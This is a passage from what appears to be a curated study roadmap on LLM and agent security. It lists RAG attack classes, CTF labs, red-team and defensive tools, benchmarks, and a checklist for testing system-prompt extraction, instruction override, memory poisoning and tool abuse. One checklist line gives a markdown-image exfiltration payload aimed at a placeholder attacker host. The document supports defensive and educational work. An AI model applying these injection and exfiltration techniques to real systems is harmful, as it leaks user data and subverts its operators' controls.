- [ScienceDirect — From Prompt Injections to Protocol Exploits](https://www.sciencedirect.com/science/article/pii/S2405959525001997) — 30+ attack techniques catalogued across agent ecosystems
- [Microsoft — AI Recommendation Poisoning](https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/) — Feb 2026; commercial-scale manipulation of agent recommendations observed in the wild

### 4.9 Agent Identity & Authorization

Increasingly the actual root cause behind "prompt injection" incidents: the agent had more authority than the person driving it.

- Per-agent identity with short-lived credentials rather than shared service accounts
- Audience-bound tokens; never pass a user token through to a downstream MCP server unchanged
- Human-in-the-loop gates on state-changing and irreversible actions
- Sandboxed execution and explicit blast-radius isolation
- Continuous behavioral monitoring with kill switches
- [OWASP Agent Control Standard](https://genai.owasp.org/) — Donated to the GenAI Security Project in Sept 2026; runtime enforcement model for agent behavior
- **Test for confused-deputy conditions first:** can a low-privileged input cause the agent to exercise its own high privileges?

---

## Phase 5 — RAG, Vector & Embedding Security

RAG is where enterprise data meets untrusted content, and it maps to **LLM09: Vector and Embedding Weaknesses** in the OWASP 2026 list. The knowledge base is part of the attack surface, not a trusted internal resource.

### 5.1 Attack Classes

- **Corpus / knowledge-base poisoning** — Published research shows a handful of documents among millions can reach 90%+ attack success on targeted queries; a single poisoned document is often enough to steer a specific answer
- **Indirect prompt injection via retrieved chunks** — The most common real-world RAG bug
- **Embedding inversion** — Reconstructing substantial portions of source text from stored vectors. Embeddings are not anonymization
- **Cross-tenant retrieval** — Inadequate logical partitioning in a shared vector store returning another tenant's chunks
- **Authorization drift** — The retriever runs with a service identity that ignores the calling user's document-level ACLs; the classic "the chatbot answered from a file I can't open" finding
- **Retrieval-side exfiltration** — Using the retriever as an oracle to enumerate the corpus
- **Federation knowledge conflict** — Conflicting sources causing unpredictable trust resolution
- **Similarity-search DoS** — Weaponizing unbounded ANN query cost

### 5.2 Reading

- [OWASP LLM09 — Vector and Embedding Weaknesses](https://genai.owasp.org/llm-top-10/) — The normative description
- [RAG Security: The Forgotten Attack Surface — Christian Schneider](https://christian-schneider.net/blog/rag-security-forgotten-attack-surface/) — Feb 2026; the best single practitioner write-up, with concrete detection guidance
- [PoisonedRAG (USENIX Security 2025)](https://arxiv.org/abs/2402.07867) — The reference corpus-poisoning paper
- [Towards Secure Retrieval-Augmented Generation: Threats, Defenses and Benchmarks (arXiv 2603.21654)](https://arxiv.org/abs/2603.21654) — 2026 survey covering inversion, poisoning and defenses. `Unverified` ID
- [Can You Trust the Vectors in Your Vector Database? (arXiv 2604.05480)](https://arxiv.org/abs/2604.05480) — Black-hole attacks from embedding-space defects. `Unverified` ID

### 5.3 Testing a RAG Pipeline

A practical checklist for engagements:

1. Can you get content into the corpus? (upload, crawl, ticket, email, shared drive, wiki)
2. Does retrieved content get treated as instructions rather than data?
3. Is document-level authorization enforced at retrieval time or only at the UI?
4. In multi-tenant deployments, can crafted near-duplicate queries surface another tenant's chunks?
5. Are ingested documents scanned for injection payloads and invisible Unicode before embedding?
6. Are retrieval traces logged with attribution, so a poisoned chunk can be traced and quarantined?
7. Can the vector store be reached directly, without going through the application?

---

## Phase 6 — Hands-On Practice

### 6.1 Interactive Platforms & Games

| Platform | Description | Link |
|---|---|---|
| Gandalf | LLM prompt testing game — extract the password (8 levels) | [gandalf.lakera.ai](https://gandalf.lakera.ai/) |
| OWASP FinBot CTF ⭐ NEW | "The Juice Shop for Agentic AI." Multi-agent vendor-management platform with real tool access; challenges mapped to OWASP LLM Top 10, ASI Top 10, CWE and MITRE ATLAS. No setup, browser-based | [owasp-finbot-ctf.org](https://owasp-finbot-ctf.org/) |
| AI Goat (AIGoat) ⭐ NEW | Local-first, fully offline vulnerable AI e-commerce app (Ollama-backed). Attack labs + CTF challenges + progressive defense levels across the whole OWASP LLM Top 10 | [github.com/AISecurityConsortium/AIGoat](https://github.com/AISecurityConsortium/AIGoat) |
| Damn Vulnerable MCP Server (DVMCP) ⭐ NEW | 10 Dockerized MCP challenges: prompt injection, tool poisoning, excessive permissions, rug pulls, tool shadowing, token theft, multi-vector chains | [github.com/harishsg993010/damn-vulnerable-MCP-server](https://github.com/harishsg993010/damn-vulnerable-MCP-server) |
| Prompt Airlines | Gamified prompt injection learning | [promptairlines.com](https://promptairlines.com/) |
| Crucible | Interactive AI security challenges by Dreadnode | [crucible.dreadnode.io](https://crucible.dreadnode.io/) |
| Immersive Labs AI | Structured AI security exercises | [prompting.ai.immersivelabs.com](https://prompting.ai.immersivelabs.com/) |
| Secdim AI Games | Prompt injection games | [play.secdim.com/game/ai](https://play.secdim.com/game/ai) |
| HackAPrompt | Community prompt injection competition | [hackaprompt.com](https://www.hackaprompt.com/) |
| PortSwigger LLM Labs | Hands-on web LLM attack labs — prompt injection, excessive agency, insecure output handling | [Web Security Academy](https://portswigger.net/web-security/llm-attacks) |
| PromptTrace | 7 labs + 15-level CTF with real-time context trace | [prompttrace.airedlab.com](https://prompttrace.airedlab.com/) · `Unverified` |
| CrowdStrike AI Unlocked | Agent-focused prompt injection challenges (Feb 2026) | [crowdstrike.com](https://www.crowdstrike.com/en-us/blog/introducing-ai-unlocked-interactive-prompt-injection-challenge/) |
| AI/LLM Exploitation Challenges | AI, ML, LLM CTF challenges | [8ksec.io](https://academy.8ksec.io/course/ai-exploitation-challenges) |
| LLMVault | CTF-style LLM security lab aligned to the OWASP LLM Top 10 | [github.com/CyberSunil/LLMVault](https://github.com/CyberSunil/LLMVault) · `Unverified` |
| Jackpot | Ten-floor casino, each floor a deliberately broken AI, one per OWASP LLM Top 10 category | [hego.red/jackpot](https://hego.red/jackpot) · `Unverified` |

### 6.2 Vulnerable-by-Design Projects

| Repository | Description |
|---|---|
| [Damn Vulnerable LLM Agent — WithSecureLabs](https://github.com/WithSecureLabs/damn-vulnerable-llm-agent) | Intentionally vulnerable ReAct LLM agent |
| [Damn Vulnerable MCP Server](https://github.com/harishsg993010/damn-vulnerable-MCP-server) | ⭐ 10 MCP challenges, easy → hard, Docker ports 9001–9010 |
| [AIGoat — AI Security Consortium](https://github.com/AISecurityConsortium/AIGoat) | ⭐ Full OWASP LLM Top 10 coverage, runs offline with Ollama |
| [OWASP FinBot CTF (source)](https://github.com/GenAI-Security-Project/finbot-ctf) | ⭐ Self-hostable agentic CTF platform, Python 3.13+ |
| [OWASP GenAI Red Team Lab](https://github.com/GenAI-Security-Project/GenAI-Red-Team-Lab) | ⭐ Local LLM and RAG sandboxes + garak/promptfoo exploitation examples |
| [invariantlabs-ai/mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments) | ⭐ Reproducible tool poisoning, shadowing and sleeper rug-pull servers |
| [ScottLogic Prompt Injection Playground](https://github.com/ScottLogic/prompt-injection) | Local prompt injection lab |
| [Greshake LLM Security Tools](https://github.com/greshake/llm-security) | Proof-of-concept attacks · `Foundational` |
| [ctf-prompt-injection by CharlesTheGreat77](https://github.com/CharlesTheGreat77/ctf-prompt-injection) | Dockerized CTF with Ollama + local LLM, progressively harder levels |
| [ai-prompt-ctf by c-goosen](https://github.com/c-goosen/ai-prompt-ctf) | Indirect injection against tool-calling agents: RAG, function calling, ReAct |

### 6.3 Tutorials

- [Google AI Red Teaming Walkthrough (PDF)](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf)
- [Spikee: Testing LLM Apps for Prompt Injection — WithSecure Labs](https://labs.withsecure.com/tools/spikee) — Step-by-step with Burp Suite integration
- [How AI Prompt Injection Works | Hands-on with LLMs (YouTube)](https://www.youtube.com/watch?v=fCpAr2OylDw) — Jan 2026 code-level demo with LLM Guard detection
- [Prompt Injection in LLM Agents: ReAct, Langchain (YouTube)](https://www.youtube.com/watch?v=43qfHaKh0Xk) — Theory and hands-on lab
- [Synthetic Recollections — WithSecure Labs](https://labs.withsecure.com/publications/llm-agent-prompt-injection) — ReAct loop hijacking via forged thoughts
- [garak documentation](https://docs.garak.ai/) — Getting from `garak --model_type openai` to a usable report

### 6.4 CTF Writeups to Study

- [CTF Writeup — HackPack CTF 2024 LLM Edition](https://medium.com/@embossdotar/ctf-writeup-hackpack-ctf-2024-llm-edition-yellowdog-1-db02a36e1051)
- [LLM Pentest Writeups — System Weakness](https://systemweakness.com/large-language-model-llm-pen-testing-part-i-2ef96acb6763)

---

## Phase 7 — Advanced Exploitation Techniques

### 7.1 Agent & Tool Integration Attacks

- [LLM Pentest: Leveraging Agent Integration for RCE — BlazeInfoSec](https://www.blazeinfosec.com/post/llm-pentest-agent-hacking/)
- [Dumping a Database with an AI Chatbot — Synack](https://www.synack.com/blog/dumping-a-database-with-an-ai-chatbot/)
- [CSWSH Meets LLM Chatbots](https://medium.com/@r3vsh/cswsh-meets-llm-chatbots-3ab09af5ab6f)
- [Prompt Injection Attacks on Agentic Coding Assistants (SoK, arXiv 2026)](https://arxiv.org/html/2601.17548v1) — Meta-analysis of 78 studies; >85% attack success against state-of-the-art defenses

### 7.2 Data Exfiltration via LLMs

- [Google AI Studio: LLM-Powered Data Exfiltration](https://embracethered.com/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/)
- [Google AI Studio Mass Data Exfil (Regression)](https://embracethered.com/blog/posts/2024/google-aistudio-mass-data-exfil/)
- [Hacking Google Bard — From Prompt Injection to Data Exfiltration](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/)
- [AWS Amazon Q Markdown Rendering Vulnerability](https://embracethered.com/blog/posts/2024/aws-amazon-q-fixes-markdown-rendering-vulnerability/)
- [GitHub Copilot Chat Data Exfiltration](https://embracethered.com/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/)
- [ChatGPT Plugins: Data Exfiltration via Images & Cross Plugin Request Forgery](https://embracethered.com/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/)

### 7.3 Account Takeover & Authentication Attacks

- [ChatGPT Account Takeover — Wildcard Web Cache Deception](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [Shockwave — Critical ChatGPT Vulnerability (Web Cache Deception)](https://www.shockwave.cloud/blog/shockwave-works-with-openai-to-fix-critical-chatgpt-vulnerability)
- [Security Flaws in ChatGPT Ecosystem — Salt Security](https://salt.security/blog/security-flaws-within-chatgpt-extensions-allowed-access-to-accounts-on-third-party-websites-and-sensitive-data)
- [OpenAI Allowed Unlimited Credit on New Accounts — Checkmarx](https://checkmarx.com/blog/openai-allowed-unlimited-credit-on-new-accounts/)

### 7.4 XSS & Web Vulnerabilities in AI Products

- [XSS Marks the Spot: Digging Up Vulnerabilities in ChatGPT — Imperva](https://www.imperva.com/blog/xss-marks-the-spot-digging-up-vulnerabilities-in-chatgpt/)
- [Zeroday on GitHub Copilot](https://gccybermonks.com/posts/github/)
- [Prompt Injection 2.0: Hybrid AI Threats (arXiv 2507.13169)](https://arxiv.org/abs/2507.13169) — Prompt injections combined with XSS, CSRF, AI worm propagation to evade WAFs

### 7.5 Model & Infrastructure Attacks

- [Shelltorch Explained — Multiple Vulnerabilities in TorchServe (CVSS 9.9)](https://www.oligo.security/blog/shelltorch-explained-multiple-vulnerabilities-in-pytorch-model-server)
- [From ChatBot to SpyBot: ChatGPT Post-Exploitation — Imperva](https://www.imperva.com/blog/from-chatbot-to-spybot-chatgpt-post-exploitation/)
- [Microsoft FIDES — Information-Flow Control Against IPI in Copilot](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks) — Jul 2025 privilege separation system

### 7.6 Persistent Attacks & Memory Exploitation

- [ChatGPT Persistent Denial of Service via Memory Attacks — Embrace the Red](https://embracethered.com/blog/posts/2024/chatgpt-persistent-denial-of-service/)
- [Embrace the Red — memory persistence research](https://embracethered.com/blog/) — Ongoing work on writing durable instructions into assistant memory ("spAIware" class)

### 7.7 Adversarial Machine Learning

- [CleverHans Library](https://github.com/cleverhans-lab/cleverhans) — Adversarial example library · `Foundational`
- [ART (Adversarial Robustness Toolbox) — IBM](https://github.com/Trusted-AI/adversarial-robustness-toolbox)
- [Foolbox](https://github.com/bethgelab/foolbox) — Python toolbox for adversarial attacks
- [TextAttack](https://github.com/QData/TextAttack) — Adversarial attacks and data augmentation for NLP
- [Microsoft Counterfit](https://github.com/Azure/counterfit) — CLI for assessing ML model security · `Archived` but still useful as a harness pattern
- [NIST AI 100-2e2025](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2025.pdf) — Use as the vocabulary for evasion, poisoning, privacy and abuse attacks

### 7.8 Supply Chain & Model File Attacks

- Malicious code embedded in model files (pickle, safetensors) can execute on load
- 250 poisoned documents in training data can implant backdoors that activate on trigger phrases
- [ModelScan — ProtectAI](https://github.com/protectai/modelscan) — Scan ML model files for malicious payloads
- [picklescan](https://github.com/mmaitre314/picklescan) — Detects unsafe globals in pickled model files; used by Hugging Face scanning
- [Hugging Face — model security documentation](https://huggingface.co/docs/hub/security) — Malware scanning, pickle scanning, secrets scanning, and how to read the warnings on a repo
- Fake npm/pip packages mimicking AI integrations (e.g., fake email MCP that silently copies outbound messages)
- Agent skill and plugin marketplaces (see [4.4](#44-agent-skills-plugins--extension-supply-chain)) — now the highest-velocity part of this surface
- **Provenance direction of travel:** AIBOM, model signing and SLSA-style attestation for weights and datasets; expect these to become audit requirements before they become reliable controls

---

## Phase 8 — Real-World Research & Bug Bounty

### 8.1 Notable Research & Disclosures

- [Anthropic — Disrupting the first reported AI-orchestrated cyber espionage campaign](https://www.anthropic.com/news/disrupting-AI-espionage) — The GTG-1002 report
- [We Hacked Google AI for $50,000 — LandH](https://www.landh.tech/blog/20240304-google-hack-50000/)
- [New Google Gemini Content Manipulation Vulnerabilities — HiddenLayer](https://hiddenlayer.com/research/new-google-gemini-content-manipulation-vulns-found/#Overview)
- [Jailbreak of Meta AI (Llama 3.1) Revealing Config Details](https://medium.com/@kiranmaraju/jailbreak-of-meta-ai-llama-3-1-revealing-configuration-details-9f0759f5006a)
- [My LLM Bug Bounty Journey on Hugging Face Hub](https://medium.com/@zpbrent/my-llm-bug-bounty-journey-on-hugging-face-hub-via-protect-ai-9f3a1bc72c2e)
- [Anonymised Penetration Test Report — Volkis](https://handbook.volkis.com.au/assets/doc/Volkis%20-%20Anonymous%20Client%20-%20Penetration%20Test%20May%202023.pdf)
- [Lakera Real World LLM Exploits (PDF)](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf)
- [The Register — Anthropic, Google, Microsoft paid AI bug bounties quietly](https://www.theregister.com/security/2026/04/15/anthropic-google-microsoft-paid-ai-bug-bounties-quietly/) — Apr 2026; agent prompt injection to credential theft across three vendors, and the CVE-assignment gap it exposed
- [AI Penetration Testing: A Complete Guide — HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html) — Mar 2026 comprehensive playbook
- [Orca AI Incident Archive](https://github.com/Continuum-AI-Corp/Orca-AI-Incident-Archive) — Open database of real-world AI agent security incidents, Jan 2025 → Sep 2026; every record cites a primary source and flags confirmed harm vs. demonstrated-only, plus whether AI involvement is confirmed

### 8.2 How to Find LLM Vulnerabilities

Key areas to test when assessing an LLM-powered application:

1. **System prompt extraction** — Can you leak the hidden system prompt?
2. **Hidden context exposure** — Beyond the system prompt: retrieved docs, memory, tool responses, app state (OWASP LLM08:2026)
3. **Instruction override** — Can you ignore system-level instructions?
4. **Plugin/tool abuse** — Can agent tools be misused (SSRF, RCE, SQLi)?
5. **MCP tool poisoning** — Can you inject instructions into tool metadata?
6. **Tool shadowing / rug pull** — Can a second server intercept or mutate a trusted tool?
7. **Data exfiltration via markdown** — Does the UI render `![](https://attacker.com?q=...)` ?
8. **Persistent injection via memory/RAG** — Can you inject instructions that persist?
9. **PII leakage** — Does the model reveal training data or other users' data?
10. **Cross-user / cross-tenant data leakage** — In multi-tenant apps, can you reach other users' contexts or vector chunks?
11. **Authorization bypass** — Can you trick the LLM into performing privileged actions?
12. **Confused deputy** — Does the agent's identity carry more authority than the requesting user's?
13. **Multi-turn escalation** — Can you steer the model across conversation turns?
14. **AI IDE rules file backdoor** — Can `.cursor/rules`, `CLAUDE.md`, `AGENTS.md` or hooks be poisoned?
15. **Agent skill / plugin poisoning** — Is third-party skill content reviewed, signed, or sandboxed?
16. **Supply chain** — Are third-party models/datasets scanned for malicious payloads?
17. **Unbounded consumption** — Can you drive cost or latency DoS through prompts, retrieval, or sampling?

---

## Standards, Frameworks & References

| Resource | Description |
|---|---|
| [OWASP GenAI LLM Top 10 (2026)](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) | **Current.** Published 4 Aug 2026; adds Hidden Context Exposure, elevates Excessive Agency, maps to NIST/ATLAS/CWE/ASI |
| [OWASP LLM Top 10 (2025)](https://genai.owasp.org/llm-top-10/) | `Legacy` — still the mapping target for most 2025–early-2026 tooling and CTFs |
| [OWASP Top 10 for LLM Apps v1.1 (2023)](https://owasp.github.io/www-project-top-10-for-large-language-model-applications/) | `Historical` archive |
| [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) | ASI01–ASI10; goal hijack, tool misuse, memory poisoning, rogue agents |
| [OWASP MCP Top 10](https://owasp.org/www-project-mcp-top-10/) | MCP01–MCP10 protocol-layer risks |
| [OWASP Agent Control Standard](https://genai.owasp.org/) | Runtime enforcement model for agent behavior, donated Sept 2026 |
| [OWASP AI Exchange](https://owaspai.org/) | Cross-industry AI security guidance; feeds ISO/IEC and EU AI Act work |
| [OWASP GenAI Red Teaming Guide](https://genai.owasp.org/) | Practical red teaming methodology (Resources index) |
| [MITRE ATLAS](https://atlas.mitre.org/matrices/ATLAS/) | AI adversarial threat matrix; v5.1.0 Nov 2025, agentic techniques added through 2026 |
| [MITRE ATLAS Navigator & Arsenal](https://atlas.mitre.org/) | Free threat-modeling and red-team tooling built on the matrix |
| [NIST AI 100-2e2025](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2025.pdf) | Adversarial ML taxonomy and terminology (March 2025) |
| [NIST AI RMF](https://airc.nist.gov/Home) | US Federal AI risk management framework |
| [NIST AI 600-1 — Generative AI Profile](https://airc.nist.gov/) | GenAI-specific companion profile to the AI RMF |
| [ISO/IEC 42001](https://www.iso.org/standard/81230.html) | International AI management standard |
| [ENISA AI Threat Landscape](https://www.enisa.europa.eu/publications/enisa-threat-landscape-for-artificial-intelligence) | EU AI threat landscape report |
| [Google Secure AI Framework (SAIF)](https://safety.google/cybersecurity-advancements/saif/) | Google's AI security framework |
| [CISA — AI security guidance](https://www.cisa.gov/ai) | US joint guidance on deploying AI systems securely |
| [UK NCSC — Machine Learning Principles](https://www.ncsc.gov.uk/collection/machine-learning) | Principles-based ML security guidance referenced by NIST |
| [CSA AI Controls Matrix](https://cloudsecurityalliance.org/research/working-groups/ai-controls) | 247 control objectives across 18 domains; maps to ISO 42001 and ISO 27001 |
| [Model Context Protocol specification](https://modelcontextprotocol.io/) | Read the security and authorization sections of the current revision |

---

## Tools & Repositories

### Offensive / Red Team Tools

| Tool | Purpose |
|---|---|
| [garak — NVIDIA](https://github.com/NVIDIA/garak) | LLM vulnerability scanner — 100+ probes for injection, jailbreaks, leakage. **Note: the canonical repo moved from `leondz/garak` to `NVIDIA/garak`.** Paper: [arXiv 2406.11036](https://arxiv.org/abs/2406.11036) |
| [PyRIT](https://github.com/Azure/PyRIT) | Microsoft's Python Risk Identification Toolkit; multi-turn strategies (Crescendo, TAP, Skeleton Key) across text, image, audio |
| [promptfoo](https://github.com/promptfoo/promptfoo) | ⭐ LLM eval + red teaming with 50+ vulnerability checks and first-class CI/CD integration |
| [DeepTeam](https://github.com/confident-ai/deepteam) | ⭐ Red-teaming framework simulating jailbreaks and multi-turn attacks across 40+ probes |
| [Giskard](https://github.com/Giskard-AI/giskard) | ⭐ Testing framework detecting injection, hallucination, bias and toxicity |
| [PurpleLlama / CyberSecEval](https://github.com/meta-llama/PurpleLlama) | Meta's LLM security evaluation suite (repo moved from `facebookresearch/PurpleLlama`) |
| [LLM Fuzzer](https://github.com/mnns/LLMFuzzer) | Fuzzing framework for LLMs |
| [PALLMs](https://github.com/mik0w/pallms/) | Payloads for attacking LLMs |
| [PromptInject](https://github.com/agencyenterprise/PromptInject) | Prompt injection attack framework · `Foundational` |
| [LLM Injector](https://github.com/anmolksachan/LLMInjector) | LLM Injector Burp Suite Extension |
| [Prompt Map](https://github.com/utkusen/promptmap) | Security scanner for custom LLM applications |
| [Augustus — Praetorian](https://www.praetorian.com/blog/introducing-augustus-open-source-llm-prompt-injection/) | Feb 2026: 210+ probes, 47 attack categories, 28 LLM providers, Go binary |
| [Spikee — WithSecure](https://labs.withsecure.com/tools/spikee) | Custom injection datasets + automated tests, Burp Suite integration |
| [AgentSeal](https://github.com/agentseal/agentseal) | 150 attack probes against AI agents; supports OpenAI, Anthropic, Ollama · `Unverified` |
| [Token Turbulenz](https://github.com/wunderwuzzi23/token-turbulenz) | Fuzzer to automate looking for prompt injections |
| [InjectLab](https://github.com/ahow2004/injectlab) | MITRE-style matrix of adversarial prompt injection techniques · `Unverified` |

### MCP & Agent Security Tools ⭐ NEW

| Tool | Purpose |
|---|---|
| [mcp-scan — Invariant Labs](https://github.com/invariantlabs-ai/mcp-scan) | ⭐ The reference MCP scanner. Detects tool poisoning and cross-origin escalation, pins tool hashes to catch rug pulls, scans installed agents/servers/skills, and can proxy traffic through local guardrails |
| [mcp-scanner — Cisco AI Defense](https://github.com/cisco-ai-defense/mcp-scanner) | Multi-engine (YARA, LLM analysis, Cisco AI Defense) scanning of MCP tools, prompts, resources and server instructions; CLI or REST; CI/CD static mode |
| [skill-scanner — Cisco AI Defense](https://github.com/cisco-ai-defense/skill-scanner) | Static analysis of agent skills |
| [mcp-injection-experiments](https://github.com/invariantlabs-ai/mcp-injection-experiments) | Attack-side reference implementations to validate your scanner |
| [Sentinel AI](https://github.com/MaxwellCalkin/sentinel-ai) | Real-time detection across 12 languages, Claude Code attack vectors, MCP proxy · `Unverified` |
| [Armorer Guard](https://github.com/ArmorerLabs/Armorer-Guard) | Local Rust scanner for AI-agent prompt injection, credential leakage, exfiltration, MCP context, risky tool-call enforcement · `Unverified` |
| [PIC Standard](https://github.com/madeinplutofabio/pic-standard) | Protocol to block unauthorized agent actions via intent + provenance checks · `Unverified` |

### Defensive / Scanning Tools

| Tool | Purpose |
|---|---|
| [Rebuff](https://github.com/protectai/rebuff) | Prompt injection detection |
| [LLM Guard — Protect AI](https://github.com/protectai/llm-guard) | ⭐ 15 input + 20 output scanners: injection, PII, secrets, toxicity |
| [NeMo Guardrails](https://github.com/NVIDIA/NeMo-Guardrails) | NVIDIA programmable input/dialog/retrieval/output rails |
| [Lakera Guard](https://www.lakera.ai/) | Commercial prompt injection protection |
| [AI Exploits — ProtectAI](https://github.com/protectai/ai-exploits) | Real-world ML exploit collection |
| [ModelScan](https://github.com/protectai/modelscan) | Scan ML model files for malicious code |
| [picklescan](https://github.com/mmaitre314/picklescan) | ⭐ Unsafe-global detection in pickled model files |
| [Vigil LLM](https://github.com/deadbits/vigil-llm) | Stacked scanners: vector similarity, YARA, transformer classifier, canary tokens |
| [InjecGuard](https://github.com/safolab-wisc/injecguard) | +30.8% over prior SOTA on NotInject benchmark, addresses false positives |
| [openclaw-bastion](https://github.com/AtlasPA/openclaw-bastion) | Detects Unicode homoglyphs, hidden HTML injection, zero-width character smuggling · `Unverified` |
| [BodAIGuard](https://github.com/AxonLabsDev/BodAIGuard) | 3-tier detection (regex, heuristics, structural), 42 block rules · `Unverified` |
| [tldrsec/prompt-injection-defenses](https://github.com/tldrsec/prompt-injection-defenses) | Actively maintained catalog of every practical defense in production |

### Reference Lists

| Resource | Description |
|---|---|
| [Awesome LLM Security — corca-ai](https://github.com/corca-ai/awesome-llm-security) | Curated LLM security list |
| [Awesome LLM — Hannibal046](https://github.com/Hannibal046/Awesome-LLM) | Everything LLM including security |
| [Awesome AI Security — ottosulin](https://github.com/ottosulin/awesome-ai-security) | General AI security resources |
| [LLM Hacker's Handbook](https://github.com/forcesunseen/llm-hackers-handbook) | Comprehensive hacking handbook · `Foundational` |
| [PayloadsAllTheThings — Prompt Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/Prompt%20Injection/) | Payload collection |
| [WideOpenAI](https://github.com/WibblyOWobbly/WideOpenAI) | Jailbreak and bypass collection |
| [Chatgpt-DAN](https://github.com/alexisvalentino/Chatgpt-DAN) | DAN jailbreak collection · `Historical` |
| [Awesome Prompt Injection — FonduAI](https://github.com/FonduAI/awesome-prompt-injection) | Curated prompt injection resources |

---

## Benchmarks & Datasets

Reproducible measurement is what separates research from anecdote. Use these to justify findings and to test defenses rather than assert them.

| Benchmark | Focus | Link |
|---|---|---|
| **AgentDojo** | The standard agent security benchmark: 97 realistic tasks, 629 security cases across banking/email/travel/Slack (NeurIPS 2024) | [arXiv 2406.13352](https://arxiv.org/abs/2406.13352) · [GitHub](https://github.com/ethz-spylab/agentdojo) |
| **InjecAgent** | Indirect prompt injection in tool-integrated agents; 1,054 cases across 17 tools (ACL 2024) | [arXiv 2403.02691](https://arxiv.org/abs/2403.02691) |
| **WASP** | Web agent security against prompt injection (Meta) | [arXiv 2504.18575](https://arxiv.org/abs/2504.18575) |
| **WAInjectBench** | Benchmarking prompt-injection *detectors* for web agents | [arXiv 2510.01354](https://arxiv.org/abs/2510.01354) |
| **VPI-Bench** | Visual prompt injection against computer-use agents | [arXiv 2506.02456](https://arxiv.org/abs/2506.02456) |
| **HarmBench** | Standardized automated red teaming and robust refusal evaluation (ICML 2024) | [arXiv 2402.04249](https://arxiv.org/abs/2402.04249) |
| **JailbreakBench** | Reproducible jailbreak artifacts and leaderboard | [jailbreakbench.github.io](https://jailbreakbench.github.io/) |
| **CyberSecEval / PurpleLlama** | Meta's LLM cybersecurity risk evaluations | [GitHub](https://github.com/meta-llama/PurpleLlama) |
| **NotInject** | False-positive measurement for injection detectors | [InjecGuard repo](https://github.com/safolab-wisc/injecguard) |

Datasets worth knowing: the HackAPrompt competition corpus (large real-world human injection dataset), garak's bundled probe payloads, and `PayloadsAllTheThings` for quick manual coverage.

---

## Books, PDFs & E-Books

| Resource | Link |
|---|---|
| LLM Hacker's Handbook | [GitHub](https://github.com/forcesunseen/llm-hackers-handbook) |
| OWASP GenAI LLM Top 10 2026 | [OWASP](https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/) |
| OWASP Top 10 for Agentic Applications 2026 | [OWASP](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) |
| NIST AI 100-2e2025 — Adversarial ML Taxonomy | [PDF](https://nvlpubs.nist.gov/nistpubs/ai/NIST.AI.100-2e2025.pdf) |
| OWASP Top 10 for LLM (Snyk) | [PDF](https://go.snyk.io/rs/677-THP-415/images/owasp-top-10-llm.pdf) · `Legacy` |
| Bugcrowd Ultimate Guide to AI Security | [PDF](https://www.bugcrowd.com/wp-content/uploads/2024/04/Ultimate-Guide-AI-Security.pdf) |
| Lakera Real World LLM Exploits | [PDF](https://lakera-marketing-public.s3.eu-west-1.amazonaws.com/Lakera%2BAI%2B-%2BReal%2BWorld%2BLLM%2BExploits%2B(Jan%2B2024)-min.pdf) |
| HackerOne Ultimate Guide to Managing AI Risks | [E-Book](https://www.hackerone.com/resources/e-book/the-ultimate-guide-to-managing-ethical-and-security-risks-in-ai) |
| Explaining and Harnessing Adversarial Examples — Goodfellow et al. | [arXiv](https://arxiv.org/abs/1412.6572) · `Foundational` paper (also listed under Academic Papers) |
| Google AI Red Team Walkthrough | [PDF](https://services.google.com/fh/files/blogs/google_ai_red_team_digital_final.pdf) |
| AI Penetration Testing 2026 Guide | [HackingDream](https://www.hackingdream.net/2026/03/ai-penetration-testing-complete-guide-to-ai-red-teaming.html) |

---

## Video Resources & Podcasts

| Resource | Link |
|---|---|
| Penetration Testing Against and With AI/LLM/ML (Playlist) | [YouTube](https://www.youtube.com/playlist?list=PL1Aj7oPl6slsd3Er7PfeOIEFYPDQvMRUf) |
| Andrej Karpathy — Intro to Large Language Models | [YouTube](https://www.youtube.com/watch?v=zjkBMFhNj_g) |
| Andrej Karpathy — Let's build the GPT Tokenizer | [YouTube](https://www.youtube.com/watch?v=zduSFxRajkE) |
| DEF CON AI Village Talks | [YouTube](https://www.youtube.com/@AIVillage) |
| LiveOverflow — AI/ML Security | [YouTube](https://www.youtube.com/@LiveOverflow) |
| 3Blue1Brown — Neural Networks Series | [YouTube](https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi) |
| John Hammond — AI Security Challenges | [YouTube](https://www.youtube.com/@_JohnHammond) |
| Cybrary — Machine Learning Security | [Cybrary](https://www.cybrary.it/course/machine-learning-security/) |
| How AI Prompt Injection Works — Hands-On (Jan 2026) | [YouTube](https://www.youtube.com/watch?v=fCpAr2OylDw) |
| MCP Prompt Injection: How AI Gets Hacked (Nov 2025) | [YouTube](https://www.youtube.com/watch?v=bO-7DB-3dL8) |
| Prompt Injection in LLM Agents: ReAct, Langchain | [YouTube](https://www.youtube.com/watch?v=43qfHaKh0Xk) |
| Black Hat — official channel (AI/ML track talks) | [YouTube](https://www.youtube.com/@BlackHatOfficialYT) |
| USENIX Security & Enigma conference talks | [YouTube](https://www.youtube.com/@UsenixSecurity) |

**Conferences worth tracking:** DEF CON AI Village, Black Hat AI/ML track, USENIX Security, NDSS, IEEE S&P, ACM CCS, OWASP Global AppSec (the GenAI Security Project runs summits and workshops alongside it — the November 2026 edition is the next major one).

---

## CTF & Competitions

| Competition | Description | Link |
|---|---|---|
